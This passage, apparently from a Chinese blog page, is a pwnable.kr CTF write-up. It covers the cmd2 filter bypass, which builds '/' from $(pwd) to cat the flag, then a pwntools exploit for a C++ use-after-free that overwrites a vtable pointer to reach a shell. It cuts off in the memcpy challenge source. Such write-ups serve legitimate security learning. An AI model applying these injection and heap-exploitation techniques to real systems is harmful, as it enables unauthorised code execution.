class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_env</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++)    <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">    delete_env ();</span><br><span class="line">    putenv (<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter (argv [<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;% s\n&quot;</span>, argv [<span class="number">1</span>]);</span><br><span class="line">    system (argv [<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>题目增加了更多的限制，并且删除了所有环节变量。最大的限制就是不能出现路径分隔符，因此无法用绝对路径来使用 cat，但是可以用 shell 变量来造一个路径分隔符，例如 <code>echo $(pwd)</code>，如果此时位于根目录的时候，<code>$(pwd)</code> 就会返回 <code>/</code>，所以可以利用这个 payload 构造一个路径分隔符。</p><p>最后在 bash 里输入如下 payload，需要注意的是 <code>$(pwd)</code> 需要被传到 system 里，因此在 bash 里需要加上转义，否则在执行 cmd2 之前 <code>$(pwd)</code> 就会被 bash 解析为 <code>/</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">~/cmd2 <span class="string">&quot;\$(pwd) bin\$(pwd) cat \$(pwd) home\$(pwd) cmd2\$(pwd) fla*&quot;</span></span><br></pre></td></tr></table></figure><h1 id="uaf-8-pt"><a href="#uaf-8-pt" class="headerlink" title="uaf (8 pt)"></a>uaf (8 pt)</h1><p>直接给了源码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    string name;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Man</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Man</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Human::<span class="built_in">introduce</span>();</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Woman</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Woman</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">            <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">            <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">            Human::<span class="built_in">introduce</span>();</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span></span>&#123;</span><br><span class="line">    Human* m = <span class="keyword">new</span> <span class="built_in">Man</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">    Human* w = <span class="keyword">new</span> <span class="built_in">Woman</span>(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">        cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(op)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                m-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                w-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                len = <span class="built_in">atoi</span>(argv [<span class="number">1</span>]);</span><br><span class="line">                data = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line">                <span class="built_in">read</span>(<span class="built_in">open</span>(argv [<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">delete</span> m;</span><br><span class="line">                <span class="keyword">delete</span> w;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个很简单的 uaf，但是因为是 c++ 所以比较麻烦，不过利用起来还是挺简单的。Human 类直接给了一个虚函数，里面就是一个 shell，那么直接跳到这个虚表就可以了，通过 gdb 或者 ida 都可以查到这个虚函数在虚表中的位置为 * 0x*401570。</p><p>在 main 的主循环中一共有 3 个功能，use，after 和 free，use 则调用 Man 类和 Woman 类的 intriduce 函数，这个函数刚好就在 get_shell+8 的位置，如下所示。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/12.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/13.png"></p><p>free 则是将最开始 new 的 Man 和 Woman 都 free 掉，而 after 则是从一个文件中读取一定数量的字符写入，文件名和读取的数量由 argv 决定，这里并没有溢出，为了测试方便，我们先假设 argv [2] 为 <code>/dev/stdin</code>，直接从标准输入读取，后面再探讨 argv [1] 的大小应该为多少合适。main 函数中首先 new 了个 Man 和 Woman，这时候我们看一下堆里面是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/10.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/11.png"></p><p>可以看到 Man 和 Woman 一共 malloc 出了 4 个 chunk，每个类各两个，一个 0x30 大小的和一个 0x20 大小的 chunk，之所以每个类都 malloc 出两个大小，是因为 Human 中的 name 为 string 类型，在创建 string 类型之前需要 malloc 一个 chunk 出来保存字符串，所以那个 0x30 大小的 chunk 保存的是 name 中的字符串，也就是 string 类，而 0x20 大小的 chunk 中保存了 age 以及类的虚表指针，其中的 0x401570 以及 0x401550 就是这两个类对应的虚表。</p><p>题目名称是 uaf，那我们先 free 掉这 4 个 chunk 看看堆里是什么样子。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/14.png"></p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/15.png"></p><p>可以看到这 4 个 chunk 都进了 tcache，并且虚表指针也被破坏了，但是题目重点就在于 uaf，因此在 free 以后，m 和 w 变量依旧指向的是堆上那两个 chunk，在调用 introduce 的时候还是会根据 chunk 中的虚表指针跳转，那么如果我们可以想办法修改那两个 0x20 的 chunk 中的虚表指针，我们再次 use，调用 introduce 的时候就可以控制跳转的地址了。</p><p>现在我们的目标 chunk 也就是 0x20 大小的 chunk 位于 tcache 中，处于 free 状态，而通过 after 功能我们可以 malloc 一个自定大小的 chunk，那么我们如果刚好可以从 tcache 中 malloc 出来那个 0x20 的目标 chunk，那么我们就可以控制 chunk 的内容，也就是虚表指针的地址，修改这个地址为 get_shell-8 的地址，那么调用 introduce 的时候在加 8，刚好就可以跳转到 get_shell 的地址。最终的 exp 如下，需要在 tmp 中新建一个目录写入 exp，然后执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9007</span></span><br><span class="line"></span><br><span class="line">context.update (terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update (log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF (&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;/home/uaf/uaf&quot;</span>)</span><br><span class="line"><span class="comment"># pg = cyclic_gen ()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote (HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process (env=env, argv=[elf.path, <span class="built_in">str</span>(<span class="number">0x10</span>), <span class="string">&#x27;/dev/stdin&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">use</span>():</span><br><span class="line">    conn.sendlineafter (<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">data</span>):</span><br><span class="line">    conn.sendlineafter (<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    conn.send (data)</span><br><span class="line">    <span class="built_in">print</span>(conn.recvline ())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    conn.sendlineafter (<span class="string">&#x27;1. use\n2. after\n3. free\n&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">free ()</span><br><span class="line">after (<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">after (p64 (<span class="number">0x401570</span>-<span class="number">8</span>) + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>&gt;&gt;<span class="number">1</span>))</span><br><span class="line">use ()</span><br><span class="line"></span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="memcpy-10-pt"><a href="#memcpy-10-pt" class="headerlink" title="memcpy (10 pt)"></a>memcpy (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">rdtsc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">slow_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        dest [i] = src [i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fast_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="comment">// 64-byte block fast copy</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">        i = len / <span class="number">64</span>;</span><br><span class="line">        len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;movdqa (%0), %% xmm0\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 16 (%0), %% xmm1\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 32 (%0), %% xmm2\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 48 (%0), %% xmm3\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %% xmm0, (%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %% xmm1, 16 (%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %% xmm2, 32 (%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %% xmm3, 48 (%1)\n&quot;</span></span><br><span class="line">            ::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">            dest += <span class="number">64</span>;</span><br><span class="line">            src += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//byte-to-byte slow copy</span></span><br><span class="line">    <span class="keyword">if</span>(len) slow_memcpy (dest, src, len);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf (<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf (<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> t1, t2;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="type">char</span>* src;</span><br><span class="line">    <span class="type">char</span>* dest;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> low, high;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="comment">//allocate memory</span></span><br><span class="line">    <span class="type">char</span>* cache1 = mmap (<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span>* cache2 = mmap (<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    src = mmap (<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sizes [<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//setup experiment parameters</span></span><br><span class="line">    <span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;    <span class="comment">// 2^13 = 8K</span></span><br><span class="line">        low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">        high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between % d ~ % d : &quot;</span>, low, high);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span>(size &lt; low || size &gt; high)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sizes [i++] = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep (<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">    sleep (<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//run experiment</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        size = sizes [i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;experiment % d : memcpy with buffer size % d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">        dest = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);        <span class="comment">//to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc ();</span><br><span class="line">        slow_memcpy (dest, src, size);        <span class="comment">//byte-to-byte memcpy</span></span><br><span class="line">        t2 = rdtsc ();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : % llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);        <span class="comment">//to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc ();</span><br><span class="line">        fast_memcpy (dest, src, size);        <span class="comment">//block-to-block memcpy</span></span><br><span class="line">        t2 = rdtsc ();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : % llu\n&quot;</span>, t2-t1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 